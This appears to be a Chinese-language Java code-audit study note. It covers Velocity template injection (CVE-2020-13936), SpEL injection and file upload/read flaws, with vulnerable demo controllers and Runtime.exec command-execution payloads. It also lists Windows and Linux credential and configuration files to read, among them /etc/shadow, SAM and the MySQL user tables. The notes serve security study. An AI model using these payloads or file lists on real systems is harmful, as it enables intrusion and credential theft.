<h3 id="Velocity-模板注入漏洞-CVE-2020-13936"><a href="#Velocity-模板注入漏洞-CVE-2020-13936" class="headerlink" title="Velocity 模板注入漏洞(CVE-2020-13936)"></a>Velocity 模板注入漏洞(CVE-2020-13936)</h3><h4 id="evaluate-触发"><a href="#evaluate-触发" class="headerlink" title="evaluate 触发"></a>evaluate 触发</h4><p>代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.velocityssti;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.Velocity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> powerful</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VelocityEvaluate</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/velocityevaluate&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">velocity</span><span class="params">(String template)</span> </span>&#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line">        context.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;powerful&quot;</span>);</span><br><span class="line">        StringWriter swOut = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">&quot;test&quot;</span>, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload：</p>
<p>/velocityevaluate?template=%23set($e=”e”);$e.getClass().forName(“java.lang.Runtime”).getMethod(“getRuntime”,null).invoke(null,null).exec(“gnome-calculator”)</p>
<h4 id="merge-触发"><a href="#merge-触发" class="headerlink" title="merge 触发"></a>merge 触发</h4><p>代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.velocityssti;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.RuntimeServices;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.RuntimeSingleton;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.runtime.parser.node.SimpleNode;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.StringReader;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 编号7089</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> powerful</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VelocityMerge</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/velocitymerge&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">velocity2</span><span class="params">(<span class="meta">@RequestParam(defaultValue = &quot;nth347&quot;)</span> String</span></span></span><br><span class="line"><span class="function"><span class="params">                                    username)</span> <span class="keyword">throws</span> IOException, ParseException,</span></span><br><span class="line"><span class="function">            org.apache.velocity.runtime.parser.ParseException </span>&#123;</span><br><span class="line">        String templateString = <span class="keyword">new</span></span><br><span class="line">                String(Files.readAllBytes(Paths.get(<span class="string">&quot;/home/this_is_y/Code_Audit/Document/dweb2/基础/web漏洞/Demo/VelocitySSTI/src/main/resources/templates/template.vm&quot;</span>)));</span><br><span class="line">                templateString = templateString.replace(<span class="string">&quot;&lt;USERNAME&gt;&quot;</span>, username);</span><br><span class="line">        StringReader reader = <span class="keyword">new</span> StringReader(templateString);</span><br><span class="line">        VelocityContext ctx = <span class="keyword">new</span> VelocityContext();</span><br><span class="line">        ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;power7089&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;70897089&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;email&quot;</span>, <span class="string">&quot;power7089@163.com&quot;</span>);</span><br><span class="line">        StringWriter out = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        org.apache.velocity.Template template = <span class="keyword">new</span> org.apache.velocity.Template();</span><br><span class="line">        RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();</span><br><span class="line">        SimpleNode node = runtimeServices.parse(reader, String.valueOf(template));</span><br><span class="line">        template.setRuntimeServices(runtimeServices);</span><br><span class="line">        template.setData(node);</span><br><span class="line">        template.initDocument();</span><br><span class="line">        template.merge(ctx, out);</span><br><span class="line">        <span class="keyword">return</span> out.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：(/home/this_is_y/Code_Audit/Document/dweb2/基础/web漏洞/Demo/VelocitySSTI/src/main/resources/templates/template.vm文件)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($e&#x3D;&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;gnome-calculator&quot;)</span><br></pre></td></tr></table></figure>

<p>之后直接访问<a class="link" target="_blank" rel="noopener" href="http://127.0.0.1:8181/velocitymerge%E5%8D%B3%E5%8F%AF">http://127.0.0.1:8181/velocitymerge即可<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p>merge() 方法是将模板和数据合并，生成一个文本输出。它需要一个 VelocityContext 对象作为参数，<br>用于存储数据，并将数据与模板合并，生成输出。<br>evaluate() 方法也是将模板和数据合并，生成一个文本输出，但是它返回的是一个布尔值，表示模板是<br>否成功执行。evaluate() 方法通常用于执行带有条件的模板</p>
<h1 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h1><p>Spring Expression Language ，Spring 表达式语言，是一个由 Spring 框架提供的表达式语言。它是一种基于字符串的表达式语言，可以在运行时对对象进行查询和操作。</p>
<p>SpEL 表达式语言支持以下功能：</p>
<ul>
<li>Literal expressions（字面量表达式）</li>
<li>Boolean and relational operators（布尔和关系运算符）</li>
<li>Regular expressions（正则表达式）</li>
<li>Class expressions（类表达式）</li>
<li>Accessing properties, arrays, lists, maps（访问属性、数组、列表、映射）</li>
<li>Method invocation（调用方法）</li>
<li>Relational operators（关系运算符）</li>
<li>Assignment（赋值运算符）</li>
<li>Calling constructors（调用构造函数）</li>
<li>Bean references（Bean 引用）</li>
<li>Array construction（数组构造）</li>
<li>Inline lists（内联列表）</li>
<li>Ternary operator（三目运算符）</li>
<li>Variables（变量）</li>
<li>User defined functions（用户定义的函数）</li>
<li>Collection projection（集合投影）</li>
<li>Collection selection（集合选择）</li>
<li>Templated expressions（模板表达式）</li>
</ul>
<p>基础学习： <a class="link" target="_blank" rel="noopener" href="http://itmyhome.com/spring/expressions.html">http://itmyhome.com/spring/expressions.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="SpEL-用法"><a href="#SpEL-用法" class="headerlink" title="SpEL 用法"></a>SpEL 用法</h2><p>三个应用场景</p>
<ul>
<li>在注解中<br>在 Spring 中，可以使用 @Value 注解将 SpEL 表达式应用于 Bean 属性、构造函数参数和集合元素等场景。@Value 注解可以将 SpEL 表达式注入到 Bean 的属性中，支持在表达式中引用其他 Bean、属性和环境变量等。<br>例如，在以下示例中，@Value 注解将 SpEL 表达式注入到 name 属性中：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleBean</span> </span>&#123;</span><br><span class="line"><span class="meta">@Value(&quot;#&#123;systemProperties[&#x27;user.name&#x27;]&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="comment">// Getter and setter methods</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在XML配置中<br>在 Spring 中，可以在 XML 配置中使用 SpEL 表达式来配置 Bean。SpEL 表达式可以在 XML 配置中用 #{expression} 的形式引用。例如，在以下示例中，SpEL表达式将被用于设置属性值：</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exampleBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.ExampleBean&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;systemProperties[&#x27;user.name&#x27;]&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在代码块中使用 Expression<br>在 Spring 中，可以使用 SpEL 的 Expression 接口在代码块中使用 SpEL 表达式。使用 Expression 接口可以在运行时编译和评估表达式，也可以设置变量和函数等。<br>例如，在以下示例中，SpEL表达式被用于计算两个数字的和：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;2 + 3&quot;</span>);</span><br><span class="line">Integer sum = (Integer) exp.getValue();</span><br><span class="line">System.out.println(sum); <span class="comment">// Output: 5</span></span><br></pre></td></tr></table></figure>

<h2 id="SpEL-应用场景"><a href="#SpEL-应用场景" class="headerlink" title="SpEL 应用场景"></a>SpEL 应用场景</h2><p>Spring框架中的Bean定义，可以使用SpEL表达式来定义Bean的属性和构造函数参数。<br>示例代码如下所示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exampleBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.ExampleBean&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;&#x27;Hello &#x27; + worldBean.name&#125;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Spring Security框架中的权限控制，可以使用SpEL表达式来定义用户角色和资源权限。<br>示例代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PreAuthorize(&quot;hasRole(&#x27;ROLE_ADMIN&#x27;) and #account.enabled&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteUser</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line"><span class="comment">// delete user</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Spring Data框架中的查询条件，可以使用SpEL表达式来定义查询条件。<br>示例代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Query(&quot;select e from Employee e where e.salary &gt; :#&#123;#salary + 1000&#125;&quot;)</span></span><br><span class="line"><span class="function">List&lt;Employee&gt; <span class="title">findEmployeesWithSalaryGreaterThan</span><span class="params">(<span class="meta">@Param(&quot;salary&quot;)</span> <span class="keyword">int</span></span></span></span><br><span class="line"><span class="function"><span class="params">salary)</span></span>;</span><br></pre></td></tr></table></figure>

<p>Spring Batch框架中的任务配置，可以使用SpEL表达式来定义任务的参数和条件。<br>示例代码如下所示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">batch:job</span> <span class="attr">id</span>=<span class="string">&quot;exampleJob&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">batch:step</span> <span class="attr">id</span>=<span class="string">&quot;step1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">batch:tasklet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">batch:chunk</span> <span class="attr">reader</span>=<span class="string">&quot;itemReader&quot;</span> <span class="attr">writer</span>=<span class="string">&quot;itemWriter&quot;</span> <span class="attr">commit-</span></span></span><br><span class="line"><span class="tag">            <span class="attr">interval</span>=<span class="string">&quot;#&#123;jobParameters[&#x27;commit.interval&#x27;] ?: 100&#125;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">batch:tasklet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">batch:step</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">batch:job</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Java代码中的通用表达式计算，可以使用SpEL表达式来计算任意表达式。<br>示例代码如下所所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp = parser.parseExpression(<span class="string">&quot;&#x27;Hello &#x27; + &#x27;World&#x27;&quot;</span>);</span><br><span class="line">String message = (String) exp.getValue(); <span class="comment">// message = &quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="SpEL-注入漏洞"><a href="#SpEL-注入漏洞" class="headerlink" title="SpEL 注入漏洞"></a>SpEL 注入漏洞</h2><p>简单来说，当应用程序使用 SpEL 时，如果未正确处理用户输入数据，攻击者可以在表达式中注入任意的代码，并在应用程序的上下文中执行它，进而造成命令执行等漏洞。</p>
<p>在上面提到了 SpEL 的 EvaluationContext，其中 StandardEvaluationContext 使用方法更加完整。</p>
<p>因此，触发 SpEL 的漏洞的流程大致为：接收了用户的输入且未过滤等操作，将接收的参数使用StandardEvaluationContext 去处理，并对表达式调用了 getValue() 或 setValue() 方法。如上流程，后端接收了用户输入且未过滤，而攻击者精心构造攻击 payload 即可实现命令执行等危险操作。</p>
<p>示例代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.speldemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.EvaluationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.support.SimpleEvaluationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpELdemo</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 127.0.0.1:8080/spel/vul1/?</span></span><br><span class="line"><span class="comment">     ex=T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/spel/vul1&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">vul1</span><span class="params">(String ex)</span> </span>&#123;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        <span class="comment">//StandardEvaluationContext权限过大，可以执行任意代码，默认使用可以不指定</span></span><br><span class="line">        EvaluationContext evaluationContext = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">        Expression exp = parser.parseExpression(ex);</span><br><span class="line">        <span class="keyword">return</span> exp.getValue(evaluationContext).toString();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/spel/vul2&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">vul2</span><span class="params">(String ex)</span></span>&#123;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"></span><br><span class="line">        Expression exp = parser.parseExpression(ex);</span><br><span class="line">        <span class="keyword">return</span> exp.getValue().toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/spel/vul3&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">vul3</span><span class="params">(String ex)</span> </span>&#123;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        <span class="comment">//StandardEvaluationContext权限过大，可以执行任意代码，默认使用可以不指定</span></span><br><span class="line">        Expression exp = parser.parseExpression(ex);</span><br><span class="line">        <span class="keyword">return</span> exp.getValue().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>payload：</p>
<ul>
<li>127.0.0.1:8080/spel/vuln?ex=T(java.lang.Runtime).getRuntime().exec(“gnome-calculator”)</li>
</ul>
<h1 id="文件相关"><a href="#文件相关" class="headerlink" title="文件相关"></a>文件相关</h1><h2 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h2><p>现在大多数项目都是基于SpringBoot架构进行的开发，官方不建议SpringBoot使用JSP，并且做了一些限制。我自己工作半年多测过的这几十个系统，没一个本地存储文件的，都是oss。在对SpringBoot项目审计时如果想要查看是否对JSP完全解析，可以从熟悉的 pom.xml 文件下手，查看是否引入了相关依赖。如下所示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--用于编译jsp--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>探索SpringBoot是否解析JSP目的是如果该项目存在任意文件上传漏洞，那么我们可以通过上传JspShell代码最大化我们的攻击.</p>
<p>推荐文章：</p>
<p><a class="link" target="_blank" rel="noopener" href="https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/">构造优质上传漏洞Fuzz字典<i class="fas fa-external-link-alt"></i></a> <a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/188464.html">https://www.freebuf.com/articles/web/188464.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="http://pirogue.org/2017/09/29/aliyunoss/">阿里云OSS约等于文件上传漏洞 <i class="fas fa-external-link-alt"></i></a><a class="link" target="_blank" rel="noopener" href="http://pirogue.org/2017/09/29/aliyunoss/">http://pirogue.org/2017/09/29/aliyunoss/<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="任意文件读取-下载漏洞"><a href="#任意文件读取-下载漏洞" class="headerlink" title="任意文件读取/下载漏洞"></a>任意文件读取/下载漏洞</h2><h3 id="windows系统敏感文件"><a href="#windows系统敏感文件" class="headerlink" title="windows系统敏感文件"></a>windows系统敏感文件</h3><ul>
<li>boot.ini #查看系统版本 <a class="link" target="_blank" rel="noopener" href="https://www.baidu.com/link?url=nKzpWzggp1kJ00BAoWC2Zv33Gg9u4up4tLCYtoxbv6gS8CwAuhEIsfe9PE3wMraztG2jvppzyDcHN3cGX7ljrkZXnSY-rjmI_jjyBG-Tt6Lq64kgZiQVW8RDYdkd2XQl&amp;wd=&amp;eqid=b6a1b63500001eff000000065fceeed0">https://www.baidu.com/link?url=nKzpWzggp1kJ00BAoWC2Zv33Gg9u4up4tLCYtoxbv6gS8CwAuhEIsfe9PE3wMraztG2jvppzyDcHN3cGX7ljrkZXnSY-rjmI_jjyBG-Tt6Lq64kgZiQVW8RDYdkd2XQl&amp;wd=&amp;eqid=b6a1b63500001eff000000065fceeed0<i class="fas fa-external-link-alt"></i></a></li>
<li>c:/windows/php.ini #php配置信息</li>
<li>c:/windows/my.ini #MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</li>
<li>c:/winnt/php.ini</li>
<li>c:/winnt/my.ini</li>
<li>c:\mysql\data\mysql\user.MYD #mysql.user表中的数据库连接密码</li>
<li>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini #存储了虚拟主机网站路径和密码</li>
<li>c:\Program Files\Serv-U\ServUDaemon.ini</li>
<li>c:\windows\system32\inetsrv\MetaBase.xml #查看IIS的虚拟主机配置</li>
<li>c:\windows\repair\sam #WINDOWS系统初次安装的密码</li>
<li>c:\Program Files\ Serv-U\ServUAdmin.exe #6.0版本以前的serv-u管理员密码</li>
<li>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</li>
<li>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif文件 #存储了pcAnywhere的登陆密码</li>
<li>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf#查看WINDOWS系统apache文件</li>
<li>c:/Resin-3.0.14/conf/resin.conf #查看jsp开发的网站resin文件配置信息.</li>
<li>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf #查看linux系统配置的JSP虚拟主机</li>
<li>d:\APACHE\Apache2\conf\httpd.conf</li>
<li>C:\Program Files\mysql\my.ini</li>
<li>C:\mysql\data\mysql\user.MYD #存在MYSQL系统中的用户密码</li>
<li>C:\Windows\System32\drivers\etc\hostswinserver配置Telnet信息</li>
</ul>
<h3 id="Linux系统敏感文件"><a href="#Linux系统敏感文件" class="headerlink" title="Linux系统敏感文件"></a>Linux系统敏感文件</h3><ul>
<li>/etc/httpd/conf/httpd.conf</li>
<li>/etc/rc.local 有时可以读出来apache的路径</li>
<li>/usr/local/apache/conf/httpd.conf</li>
<li>/var/www/html/apache/conf/httpd.conf</li>
<li>/home/httpd/conf/httpd.conf</li>
<li>/usr/local/apache2/conf/httpd.conf</li>
<li>/usr/local/httpd/conf/httpd.conf</li>
<li>/etc/apache/httpd.conf</li>
<li>/usr/local/lib/php.ini</li>
<li>/etc/hosts.deny 定义禁止访问本机的主机</li>
<li>/etc/bashrc bash shell 的系统全局配置</li>
<li>/etc/group 系统用户组的定义文件</li>
<li>/etc/httpd/httpd.conf</li>
<li>/etc/issue 显示Linux核心的发行版本信息（用于本地登陆用户）</li>
<li>/etc/issue/net 显示Linux核心和发行版本信息（用于远程登陆用户）—-没成功</li>
<li>/etc/ssh/ssh_config ssh配置文件</li>
<li>/etc/termcap 终端定义和配置文件</li>
<li>/etc/xinetd.d</li>
<li>/etc/mtab 包含当前安装的文件系统列表 有时可以读取到当前网站的路径</li>
<li>redhat-release:包含识别当前Red Hat 版本号的字符串</li>
<li>shells:列出可用在系统上的shell命令行解释器(bash,sh,csh等).</li>
<li>/etc/vsftpd/vsftpd.conf</li>
<li>/etc/xinetd.conf xinetd 配置文件</li>
<li>/etc/protocols 列举当前可用的协议</li>
<li>/etc/logrotate.conf 维护 /var/log 目录中的日志文件</li>
<li>/etc/ld.so.conf “动态链接程序”（Dynamic Linker）的配置</li>
<li>/etc/wgetrc</li>
<li>Linux操作系统用户配置文件<ul>
<li>/etc/passwd</li>
<li>/etc/shadow</li>
<li>/etc/inputrc</li>
</ul>
</li>
<li>DNS客户机配置文件，设置DNS服务器的IP地址及DNS域名<ul>
<li>/etc/resolv.conf</li>
</ul>
</li>
<li>内容为Default Router的ip地址<ul>
<li>Redhat 5.x: /etc/sysconfig/network</li>
</ul>
</li>
<li>/etc/sendmail.cf (Linux) Sendmail(EMAIL服务器)配置文件</li>
<li>/etc/sendmail.cw 本地主机名</li>
</ul>
<h3 id="关键字-1"><a href="#关键字-1" class="headerlink" title="关键字"></a>关键字</h3><ul>
<li>org.apache.commons.io.FileUtils</li>
<li>org.springframework.stereotype.Controller</li>
<li>import java.nio.file.Files</li>
<li>import java.nio.file.Path</li>
<li>import java.nio.file.Paths</li>
<li>import java.util.Scanner</li>
<li>sun.nio.ch.FileChannelImpl</li>
<li>java.io.File.list/listFiles</li>
<li>java.io.FileInputStream</li>
<li>java.io.FileOutputStream</li>
